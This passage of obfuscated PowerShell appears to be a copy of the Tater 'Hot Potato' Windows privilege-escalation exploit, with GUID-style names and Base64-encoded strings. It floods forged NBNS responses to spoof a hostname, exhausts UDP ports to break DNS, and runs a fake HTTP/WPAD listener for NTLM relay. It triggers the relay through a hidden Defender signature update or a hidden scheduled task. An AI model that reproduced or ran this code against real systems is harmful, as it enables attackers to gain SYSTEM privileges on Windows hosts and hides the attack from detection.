                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x30,0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,
                             0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,
                             0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a +
                             ${48ae0566dbbc41ba99cbd338a8bd6726} +
                             0x44,0x61,0x74,0x65,0x3a +
                             ${c0187c7ad61a4726b71732e5924a2603} +
                             0x0d,0x0a,0x0d,0x0a
        }
        else
        {
            ${b5da3192b8fc4a15ac35b3d46a2b0161} = 0x48,0x54,0x54,0x50,0x2f,0x31,0x20 +
                             ${0692fe0f3fb24e1eaab3d7ebe23d6789}.response_StatusCode +
                             0x20 +
                             ${a5c08e2ce5664eeaaae77c8bcc57a06d} +
                             0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,
                             0x3a,0x20,0x31,0x30,0x37,0x0d,0x0a,0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,
                             0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,
                             0x2f,0x32,0x2e,0x30,0x0d,0x0a,0x44,0x61,0x74,0x65,0x3a +
                             ${c0187c7ad61a4726b71732e5924a2603} +
                             0x0d,0x0a,0x0d,0x0a
        }
        ${79717535644a4793a7330ac2814fc350}.Write(${b5da3192b8fc4a15ac35b3d46a2b0161},0,${b5da3192b8fc4a15ac35b3d46a2b0161}.Length)
        ${79717535644a4793a7330ac2814fc350}.Flush()
        start-sleep -s 1
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl_old = ${0692fe0f3fb24e1eaab3d7ebe23d6789}.request_RawUrl
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client_handle_old= ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Client.Handle
    }
}
${b2f55bf429674f20a8e2b2d66202c4c2} = 
{
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.exhaust_UDP_running = $true
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Trying to exhaust UDP source ports so DNS lookups will fail")
    ${bc049e481b4f4c118f30a2b5a93b705d} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABbAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFMAbwBjAGsAZQB0AF0A')))
    ${e9eec792ff444a9bacc34474c0a3af6c} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABbAEkAbgB0AF0A')))
    ${dd148159f9eb4d67b97dbc112be968aa}=0
    for (${dd148159f9eb4d67b97dbc112be968aa} = 0; ${dd148159f9eb4d67b97dbc112be968aa} -le 65535; ${dd148159f9eb4d67b97dbc112be968aa}++)
    {
        try
        {
            if (${dd148159f9eb4d67b97dbc112be968aa} -ne 137 -and ${dd148159f9eb4d67b97dbc112be968aa} -ne 53)
            {
                ${68348280420649309f6549b008c321de} = New-Object System.Net.IPEndpoint([System.Net.IPAddress]::Any,${dd148159f9eb4d67b97dbc112be968aa})
                ${845272ff7f074177817fe575cc011a1d} = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Dgram,[System.Net.Sockets.ProtocolType]::Udp)
                ${845272ff7f074177817fe575cc011a1d}.Bind(${68348280420649309f6549b008c321de})
                ${bc049e481b4f4c118f30a2b5a93b705d}.Add(${845272ff7f074177817fe575cc011a1d})
            }
        }
        catch
        {
            ${e9eec792ff444a9bacc34474c0a3af6c}.Add(${dd148159f9eb4d67b97dbc112be968aa});
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Couldn't bind to UDP port ${dd148159f9eb4d67b97dbc112be968aa}")
        }
    }
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.UDP_exhaust_success = $false
    while (!${0692fe0f3fb24e1eaab3d7ebe23d6789}.UDP_exhaust_success)
    {
        if(!${95f02b9fb08e4962ad9dee59c952ec8a})
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Flushing DNS resolver cache")
            ${95f02b9fb08e4962ad9dee59c952ec8a} = $true
        }
        a988fe4bed3744049e217fd2b9e7e3e0
        try
        {
            [System.Net.Dns]::GetHostEntry($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQA='))))
        }
        catch
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - DNS lookup failed so UDP exhaustion worked")
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.UDP_exhaust_success = $true
            break
        }
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - DNS lookup succeeded so UDP exhaustion failed")
        foreach (${1209d7f480dd428c945c4d5e018c2a82} in ${e9eec792ff444a9bacc34474c0a3af6c})
        {
            try
            {
                ${68348280420649309f6549b008c321de} = New-Object System.Net.IPEndpoint([System.Net.IPAddress]::Any,${dd148159f9eb4d67b97dbc112be968aa})
                ${845272ff7f074177817fe575cc011a1d} = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Dgram,[System.Net.Sockets.ProtocolType]::Udp)
                ${845272ff7f074177817fe575cc011a1d}.Bind(${68348280420649309f6549b008c321de})
                ${bc049e481b4f4c118f30a2b5a93b705d}.Add(${845272ff7f074177817fe575cc011a1d})
                $UDP_failed_ports.Remove(${1209d7f480dd428c945c4d5e018c2a82})
            }
            catch
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Failed to bind to ${1209d7f480dd428c945c4d5e018c2a82} during cleanup")
            }
        }
    }
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.exhaust_UDP_running = $false
}
${2caba0d4d3574b129f9118ab147cc4fa} = 
{
    param ($IP,$SpooferIP,$Hostname,$NBNSLimit)
    $Hostname = $Hostname.ToUpper()
    ${f7115ba3ef9a4d1e9e5675afe9dff587} = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                      0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00
    ${70f3a2d9c31d4926b1baeeaa107e6e3d} = [System.Text.Encoding]::UTF8.GetBytes($Hostname)
    ${70f3a2d9c31d4926b1baeeaa107e6e3d} = [System.BitConverter]::ToString(${70f3a2d9c31d4926b1baeeaa107e6e3d})
    ${70f3a2d9c31d4926b1baeeaa107e6e3d} = ${70f3a2d9c31d4926b1baeeaa107e6e3d}.Replace("-","")
    ${70f3a2d9c31d4926b1baeeaa107e6e3d} = [System.Text.Encoding]::UTF8.GetBytes(${70f3a2d9c31d4926b1baeeaa107e6e3d})
    for (${dd148159f9eb4d67b97dbc112be968aa}=0; ${dd148159f9eb4d67b97dbc112be968aa} -lt ${70f3a2d9c31d4926b1baeeaa107e6e3d}.Count; ${dd148159f9eb4d67b97dbc112be968aa}++)
    {
        if(${70f3a2d9c31d4926b1baeeaa107e6e3d}[${dd148159f9eb4d67b97dbc112be968aa}] -gt 64)
        {
            ${f7115ba3ef9a4d1e9e5675afe9dff587}[${dd148159f9eb4d67b97dbc112be968aa}] = ${70f3a2d9c31d4926b1baeeaa107e6e3d}[${dd148159f9eb4d67b97dbc112be968aa}] + 10
        }
        else
        {
            ${f7115ba3ef9a4d1e9e5675afe9dff587}[${dd148159f9eb4d67b97dbc112be968aa}] = ${70f3a2d9c31d4926b1baeeaa107e6e3d}[${dd148159f9eb4d67b97dbc112be968aa}] + 17
        }
    }
    ${1afba66d20a54fd4bc3f764c90047a53} = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            ${f7115ba3ef9a4d1e9e5675afe9dff587} +
                            0x00,0x20,0x00,0x01,0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00
    while(${0692fe0f3fb24e1eaab3d7ebe23d6789}.exhaust_UDP_running)
    {
        sleep -s 2
    }
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Flushing DNS resolver cache")
    a988fe4bed3744049e217fd2b9e7e3e0
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Starting NBNS spoofer to resolve $Hostname to $SpooferIP")
    ${9d2b76b47aad46cbae5e187bd13d493d} = New-Object System.Net.Sockets.UdpClient(137)
    ${0705c06cb4be4f6781ab45ee900e6615} = [System.Net.IPAddress]::Parse($IP)
    ${50011af6887a4f9992a0d32b4953ab9f} = New-Object Net.IPEndpoint(${0705c06cb4be4f6781ab45ee900e6615},137)
    ${9d2b76b47aad46cbae5e187bd13d493d}.Connect(${50011af6887a4f9992a0d32b4953ab9f})
    while (${0692fe0f3fb24e1eaab3d7ebe23d6789}.running)
    {
        :NBNS_spoofer_loop while (!${0692fe0f3fb24e1eaab3d7ebe23d6789}.hostname_spoof -and ${0692fe0f3fb24e1eaab3d7ebe23d6789}.running)
        {
            for (${dd148159f9eb4d67b97dbc112be968aa} = 0; ${dd148159f9eb4d67b97dbc112be968aa} -lt 255; ${dd148159f9eb4d67b97dbc112be968aa}++)
            {
                for (${b632751a445643d8bf68e13cb639cb7e} = 0; ${b632751a445643d8bf68e13cb639cb7e} -lt 255; ${b632751a445643d8bf68e13cb639cb7e}++)
                {
                    ${1afba66d20a54fd4bc3f764c90047a53}[0] = ${dd148159f9eb4d67b97dbc112be968aa}
                    ${1afba66d20a54fd4bc3f764c90047a53}[1] = ${b632751a445643d8bf68e13cb639cb7e}                 
                    ${9d2b76b47aad46cbae5e187bd13d493d}.Send(${1afba66d20a54fd4bc3f764c90047a53},${1afba66d20a54fd4bc3f764c90047a53}.Length)
                    if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.hostname_spoof -and $NBNSLimit -eq 'Y')
                    {
                        break NBNS_spoofer_loop
                    }
                }
            }
        }
        sleep -m 5
    }
    ${9d2b76b47aad46cbae5e187bd13d493d}.Close()
 }
${f91b74d0ee4a4680a74f3d708d1b6292} = 
{
    param ($NBNS,$NBNSLimit,$RunTime,$SpooferIP,$Hostname,$HTTPPort)
    if($RunTime)
    {    
        ${87a84bc2f8754b1ba7d9ee802fdb1dc3} = new-timespan -Minutes $RunTime
        ${d30b7dce199041ddac60ce7693d0e91d} = [System.Diagnostics.Stopwatch]::StartNew()
    }
    while (${0692fe0f3fb24e1eaab3d7ebe23d6789}.running)
    {
        if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.trigger -ne 2)
        {
            try
            {
                ${3393b09d778845eb9594f926dd064b97} = [System.Net.Dns]::GetHostEntry($Hostname).AddressList[0].IPAddressToString
            }
            catch
            {
            }
            if(${3393b09d778845eb9594f926dd064b97} -eq $SpooferIP)
            {
                if(!${7e9e05e6f3334c23bad24fc5e1ec27df})
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - $Hostname has been spoofed to $SpooferIP")
                    ${7e9e05e6f3334c23bad24fc5e1ec27df} = $true
                }
                if($NBNSLimit -eq 'Y')
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.hostname_spoof = $true
                }
                ${543b787e1d3f45f49a8e6d449acddd3b} = $true
                ${3393b09d778845eb9594f926dd064b97} = ""
            }
            elseif((!${3393b09d778845eb9594f926dd064b97} -or ${3393b09d778845eb9594f926dd064b97} -ne $SpooferIP) -and $NBNS -eq 'Y')
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.hostname_spoof = $false
                ${543b787e1d3f45f49a8e6d449acddd3b} = $false
            }
        }
        if(!${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success -and ${0692fe0f3fb24e1eaab3d7ebe23d6789}.trigger -eq 1)
        {
            if(Test-Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQA='))))
            {
                if((${f4c93bb0365440a8a712494980aa0e2b}.HasExited -or !${f4c93bb0365440a8a712494980aa0e2b}) -and !${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_success -and ${543b787e1d3f45f49a8e6d449acddd3b})
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Running Windows Defender signature update")
                    ${f4c93bb0365440a8a712494980aa0e2b} = saps -FilePath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQA='))) -Argument SignatureUpdate -WindowStyle Hidden -passthru
                }
            }
            else
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAgAG4AbwB0ACAAZgBvAHUAbgBkAA=='))))
            }
        }
        elseif(!${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success -and ${0692fe0f3fb24e1eaab3d7ebe23d6789}.trigger -eq 2)
        {
            ${cecbb67a50e64119b4d7c06c6bf41648} = gsv WebClient
            if(${cecbb67a50e64119b4d7c06c6bf41648}.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABwAGUAZAA='))))
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Starting WebClient service")
                saps -FilePath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBtAGQALgBlAHgAZQA='))) -Argument $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBDACAAcAB1AHMAaABkACAAXABcAGwAaQB2AGUALgBzAHkAcwBpAG4AdABlAHIAbgBhAGwAcwAuAGMAbwBtAFwAdABvAG8AbABzAA=='))) -WindowStyle Hidden -passthru -Wait
            }
            if(${cecbb67a50e64119b4d7c06c6bf41648}.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwA='))) -and !${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added -and !${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success)
            {
                ${0ae9dc643dff4fc4b356d13d6685e72b} = (Get-Date).AddMinutes(1)
                ${badb0bd67b194e2897b9405daef140a3} = ${0ae9dc643dff4fc4b356d13d6685e72b}.ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABIADoAbQBtAA=='))))
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task = ${0692fe0f3fb24e1eaab3d7ebe23d6789}.taskname
                if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_delete)
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task += "_"
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task += Get-Random   
                }
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Adding scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task)
                ${40952e3c45754437a31d22efaa0b91ce} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBDACAAcwBjAGgAdABhAHMAawBzAC4AZQB4AGUAIAAvAEMAcgBlAGEAdABlACAALwBUAE4AIAA='))) + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAvAFQAUgAgACAAXABcADEAMgA3AC4AMAAuADAALgAxAEAAJABIAFQAVABQAFAAbwByAHQAXAB0AGUAcwB0ACAALwBTAEMAIABPAE4AQwBFACAALwBTAFQAIAAkAHsAYgBhAGQAYgAwAGIAZAA2ADcAYgAxADkANABlADIAOAA5ADcAYgA5ADQAMAA1AGQAYQBlAGYAMQA0ADAAYQAzAH0AIAAvAEYA')))
                saps -FilePath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBtAGQALgBlAHgAZQA='))) -Argument ${40952e3c45754437a31d22efaa0b91ce} -WindowStyle Hidden -passthru -Wait
                ${82db970eb7e94013af71158b6e35df0e} = new-object -com($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA='))))
                ${82db970eb7e94013af71158b6e35df0e}.connect() 
                ${1945a4b3ca804de2883afb4c520494a9} = ${82db970eb7e94013af71158b6e35df0e}.getfolder("\").gettasks(1)
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added = $false
                foreach(${ad4dae71ab004b14b3d66ee7917dca84} in ${1945a4b3ca804de2883afb4c520494a9})
                {
                    if(${ad4dae71ab004b14b3d66ee7917dca84}.name -eq ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task)
                    {
                        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added = $true
                    }
                }
                ${82db970eb7e94013af71158b6e35df0e}.Quit()
                if(!${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added -and !${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success)
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Adding scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABmAGEAaQBsAGUAZAA='))))
                    bab42ea23cbf4b21a92a6b346d944321
                }
            }
            elseif(${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added -and (Get-Date) -ge ${0ae9dc643dff4fc4b356d13d6685e72b}.AddMinutes(2))
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Something went wrong with the service")
                bab42ea23cbf4b21a92a6b346d944321
            }
        }
        if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success)
        {
            kill -id ${f4c93bb0365440a8a712494980aa0e2b}.Id
        }
        if($RunTime)
        {
            if(${d30b7dce199041ddac60ce7693d0e91d}.Elapsed -ge ${87a84bc2f8754b1ba7d9ee802fdb1dc3})
            {
                bab42ea23cbf4b21a92a6b346d944321
            }
        } 
        sleep -m 5
    }
 }
function e6ab114d7bb34842bfe34a2599f60a34()
{
    if($WPADPort -eq '80')
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::loopback,$HTTPPort)
    }
    else
    {
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener = New-Object System.Net.Sockets.TcpListener ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_endpoint
    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.Start()
    ${459799e061d4492f95c2ee0d031e8085} = [RunspaceFactory]::CreateRunspace()
    ${459799e061d4492f95c2ee0d031e8085}.Open()
    ${459799e061d4492f95c2ee0d031e8085}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${0692fe0f3fb24e1eaab3d7ebe23d6789})
    ${f5d0a2421ed24a07ae849f0c67783b2d} = [PowerShell]::Create()
    ${f5d0a2421ed24a07ae849f0c67783b2d}.Runspace = ${459799e061d4492f95c2ee0d031e8085}
    ${f5d0a2421ed24a07ae849f0c67783b2d}.AddScript(${6a6b2c0df5ea4faabcfb12b0bd430006}) > $null
    ${f5d0a2421ed24a07ae849f0c67783b2d}.AddScript(${67e7d44a62184c85b8e9c128a6f153ed}) > $null
    ${f5d0a2421ed24a07ae849f0c67783b2d}.AddScript(${1c6cda8c35274d56928c4b71be9229b6}) > $null
    ${f5d0a2421ed24a07ae849f0c67783b2d}.AddScript(${eac4f1430af64f768baa9e4282666b4e}) > $null
    ${f5d0a2421ed24a07ae849f0c67783b2d}.AddScript(${2bb5d972bc86421abb8c77ce87a991b1}) > $null
    ${f5d0a2421ed24a07ae849f0c67783b2d}.AddScript(${79a178e97b5f4043adf4245fd9c6bc82}).AddArgument($Command).AddArgument($HTTPPort).AddArgument(
                               $WPADDirectHosts).AddArgument($WPADPort) > $null
    ${f5d0a2421ed24a07ae849f0c67783b2d}.BeginInvoke() > $null
}
function ed23a7b1ccbc42b9b7eec573da03fda6()
{
    ${275725d50cb34064bf83f1ca43bd8e8e} = [RunspaceFactory]::CreateRunspace()
    ${275725d50cb34064bf83f1ca43bd8e8e}.Open()
    ${275725d50cb34064bf83f1ca43bd8e8e}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${0692fe0f3fb24e1eaab3d7ebe23d6789})
    ${34acf34a2b5c48d88901159f5796cb68} = [PowerShell]::Create()
    ${34acf34a2b5c48d88901159f5796cb68}.Runspace = ${275725d50cb34064bf83f1ca43bd8e8e}
    ${34acf34a2b5c48d88901159f5796cb68}.AddScript(${6a6b2c0df5ea4faabcfb12b0bd430006}) > $null
    ${34acf34a2b5c48d88901159f5796cb68}.AddScript(${b2f55bf429674f20a8e2b2d66202c4c2}) > $null
    ${34acf34a2b5c48d88901159f5796cb68}.BeginInvoke() > $null
}
function e3255b1dec0f45479127caf7d62cb15f()
{
    ${404cd87543884de9ac69c1da78b97c51} = [RunspaceFactory]::CreateRunspace()
    ${404cd87543884de9ac69c1da78b97c51}.Open()
    ${404cd87543884de9ac69c1da78b97c51}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${0692fe0f3fb24e1eaab3d7ebe23d6789})
    ${4b2de49491e849d7b4b989cf1c7cc07e} = [PowerShell]::Create()
    ${4b2de49491e849d7b4b989cf1c7cc07e}.Runspace = ${404cd87543884de9ac69c1da78b97c51}
    ${4b2de49491e849d7b4b989cf1c7cc07e}.AddScript(${6a6b2c0df5ea4faabcfb12b0bd430006}) > $null
    ${4b2de49491e849d7b4b989cf1c7cc07e}.AddScript(${2bb5d972bc86421abb8c77ce87a991b1}) > $null
    ${4b2de49491e849d7b4b989cf1c7cc07e}.AddScript(${2caba0d4d3574b129f9118ab147cc4fa}).AddArgument($IP).AddArgument($SpooferIP).AddArgument(
                                  $Hostname).AddArgument($NBNSLimit) > $null
    ${4b2de49491e849d7b4b989cf1c7cc07e}.BeginInvoke() > $null
}
function af66029e621f40bca1daab3f27bcdaea()
{
    ${b6c7c8e805b843e2b233f53323d474df} = [RunspaceFactory]::CreateRunspace()
    ${b6c7c8e805b843e2b233f53323d474df}.Open()
    ${b6c7c8e805b843e2b233f53323d474df}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${0692fe0f3fb24e1eaab3d7ebe23d6789})
    ${808e321995644f388304fac1ce302515} = [PowerShell]::Create()
    ${808e321995644f388304fac1ce302515}.Runspace = ${b6c7c8e805b843e2b233f53323d474df}
    ${808e321995644f388304fac1ce302515}.AddScript(${6a6b2c0df5ea4faabcfb12b0bd430006}) > $null
    ${808e321995644f388304fac1ce302515}.AddScript(${f91b74d0ee4a4680a74f3d708d1b6292}).AddArgument($NBNS).AddArgument($NBNSLimit).AddArgument(
                                $RunTime).AddArgument($SpooferIP).AddArgument($Hostname).AddArgument(
                                $HTTPPort) > $null
    ${808e321995644f388304fac1ce302515}.BeginInvoke() > $null
}
e6ab114d7bb34842bfe34a2599f60a34
if($ExhaustUDP -eq 'Y')
{
    ed23a7b1ccbc42b9b7eec573da03fda6
}
if($NBNS -eq 'Y')
{
    e3255b1dec0f45479127caf7d62cb15f
}
af66029e621f40bca1daab3f27bcdaea
if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_output)
{
    :console_loop while(${0692fe0f3fb24e1eaab3d7ebe23d6789}.running -and ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_output)
    {
        while(${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Count -gt 0)
        {
            echo(${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue[0] + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.newline)
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.RemoveRange(0,1)
        }
        if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_input)
        {
            if([Console]::KeyAvailable)
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_output = $false
                BREAK console_loop
            }
        }
        sleep -m 5
    }
    if(!${0692fe0f3fb24e1eaab3d7ebe23d6789}.running)
    {
        rv tater -scope global
    }
}
}
function Stop-T
{
    if(${0692fe0f3fb24e1eaab3d7ebe23d6789})
    {
        if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.running)
        {
            echo "$(Get-Date -format 's') - Stopping HTTP listener"
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.server.blocking = $false
            sleep -s 1
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.server.Close()
            sleep -s 1
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.Stop()
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.running = $false
            if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_delete -and ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added)
            {
                ${9e62886c60fe4e379b95b800f50f01f7} = $false
                ${82db970eb7e94013af71158b6e35df0e} = new-object -com($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA='))))
                ${82db970eb7e94013af71158b6e35df0e}.connect()
                ${1d9b2115f42a4fee8295b5cb637bc759} = ${82db970eb7e94013af71158b6e35df0e}.getfolder("\")
                ${1945a4b3ca804de2883afb4c520494a9} = ${1d9b2115f42a4fee8295b5cb637bc759}.gettasks(1)
                foreach(${ad4dae71ab004b14b3d66ee7917dca84} in ${1945a4b3ca804de2883afb4c520494a9})
                {
                    if(${ad4dae71ab004b14b3d66ee7917dca84}.name -eq ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task)
                    {
                        ${1d9b2115f42a4fee8295b5cb637bc759}.DeleteTask(${ad4dae71ab004b14b3d66ee7917dca84}.name,0)
                    }
                }
                foreach(${ad4dae71ab004b14b3d66ee7917dca84} in ${1945a4b3ca804de2883afb4c520494a9})
                {
                    if(${ad4dae71ab004b14b3d66ee7917dca84}.name -eq ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task)
                    {
                        ${9e62886c60fe4e379b95b800f50f01f7} = $true
                    }
                }
                if(${9e62886c60fe4e379b95b800f50f01f7})
                {
                    echo ("$(Get-Date -format 's') - Scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkA'))))
                }
                else
                {
                    echo ("$(Get-Date -format 's') - Scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAaQBvAG4AIABmAGEAaQBsAGUAZAAsACAAcgBlAG0AbwB2AGUAIABtAGEAbgB1AGEAbABsAHkA'))))
                }
            }
            elseif(${0692fe0f3fb24e1eaab3d7ebe23d6789}.task_added)
            {
                echo ("$(Get-Date -format 's') - Remove scheduled task " + ${0692fe0f3fb24e1eaab3d7ebe23d6789}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABtAGEAbgB1AGEAbABsAHkAIAB3AGgAZQBuACAAZgBpAG4AaQBzAGgAZQBkAA=='))))
            }
            echo "$(Get-Date -format 's') - Tater has been stopped"
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHQAZQByACAAaQBzAG4AJwB0ACAAcgB1AG4AbgBpAG4AZwA=')))
        }
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHQAZQByACAAaQBzAG4AJwB0ACAAcgB1AG4AbgBpAG4AZwA=')))
